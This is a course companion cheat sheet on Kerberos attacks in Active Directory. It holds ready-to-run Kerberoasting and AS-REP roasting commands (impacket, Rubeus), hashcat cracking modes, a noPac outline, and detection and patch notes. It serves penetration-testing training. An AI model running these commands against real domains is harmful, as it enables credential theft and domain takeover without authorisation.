---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — Kerberos Attacks

*Companion to [Module 03 — Kerberos Attacks](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test Active Directory environments you own or have explicit written permission to test.

## Kerberoasting — TGS for any SPN, crack offline

Needs one valid domain credential. `impacket` script syntax is `domain/user:password@dc`.

```bash
# Enumerate SPNs and request their tickets
GetUserSPNs.py corp.local/jsmith:'Welcome1!' -dc-ip 10.10.0.10          # list roastable accounts
GetUserSPNs.py corp.local/jsmith:'Welcome1!' -dc-ip 10.10.0.10 -request # request all + print hashes
GetUserSPNs.py corp.local/jsmith:'Welcome1!' -dc-ip 10.10.0.10 \
  -request-user svc-sql -outputfile kerb.hash                            # target one SPN, save hash

# Request RC4 explicitly (etype 23) — cracks far faster than AES
GetUserSPNs.py ... -request -no-preauth-decrypt      # (default is what the KDC hands back)
```

## AS-REP roasting — no credential needed

Targets accounts with `DONT_REQUIRE_PREAUTH` set. `-usersfile` lets you spray a name list unauthenticated.

```bash
# You have a username list, no password:
GetNPUsers.py corp.local/ -dc-ip 10.10.0.10 -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash
# You have a credential — let impacket enumerate the no-preauth accounts itself:
GetNPUsers.py corp.local/jsmith:'Welcome1!' -dc-ip 10.10.0.10 -request -format hashcat
```

## Cracking — the hashcat modes (memorise these)

```bash
hashcat -m 13100 kerb.hash  rockyou.txt       # Kerberoast TGS-REP, RC4 (etype 23)  ← most common
hashcat -m 19600 kerb.hash  rockyou.txt       # Kerberoast TGS-REP, AES128 (etype 17)
hashcat -m 19700 kerb.hash  rockyou.txt       # Kerberoast TGS-REP, AES256 (etype 18)  — much slower
hashcat -m 18200 asrep.hash rockyou.txt       # AS-REP roast (etype 23)
hashcat -m 13100 kerb.hash  -a 3 '?u?l?l?l?l?l?d?d'   # mask attack when a wordlist misses
```

Note: the module cites `-m 19600` for AES256; hashcat's canonical AES256 TGS-REP mode is **19700**
(19600 is AES128). If a hash won't crack under one, check the `$krb5tgs$<etype>$` tag in the file and
match the mode to the etype.

## Rubeus (Windows / C#) — the same attacks from a domain host

```powershell
Rubeus.exe kerberoast /outfile:kerb.hash          # roast every SPN the current user can see
Rubeus.exe kerberoast /user:svc-sql /rc4opsec      # target one, force RC4 only where safe
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
Rubeus.exe kerberoast /stats                        # triage: which accounts, which etypes, no roast
```

## noPac — one flaw to DC impersonation (CVE-2021-42278 + -42287)

```bash
# Any authenticated user renames a controlled machine account to spoof a DC → TGT as the DC.
# Use the maintained noPac tooling / impacket addcomputer.py + renameMachine + getST workflow.
# Fix: November 2021 patch. Alert on: machine-account renames.
```

## Gotchas worth remembering

- **Clock skew kills Kerberos.** More than ~5 minutes of drift between your attacker box and the DC and
  every request fails with `KRB_AP_ERR_SKEW`. `sudo ntpdate <dc-ip>` (or `rdate`) before you start.
- **The RC4 downgrade is the whole detection story.** A TGS handed out as etype 23 for an account that
  normally uses AES is the Event 4769 anomaly a defender keys on — there is *no* failed logon to catch.
- **Match the hashcat mode to the etype in the file, not to habit.** `13100`/`18200` are RC4;
  `19600`/`19700` are AES — a mismatch reports "no hashes loaded" or silently never cracks.
- **AS-REP roasting is more dangerous but rarer.** It needs zero credentials, but `DONT_REQUIRE_PREAUTH`
  is trivial to audit and remove, so few accounts have it. Kerberoasting wins on the sheer abundance of SPNs.
- **A `$` at the end of the ticket = a machine account.** Those hashes are ~120 random chars (or gMSA)
  and will never crack. Filter them out before you waste GPU hours; target human service accounts.
- **noPac is patch-or-lose.** Both CVEs are CISA KEV-listed; if the Nov 2021 update isn't applied, any
  authenticated user is a DC away from you.
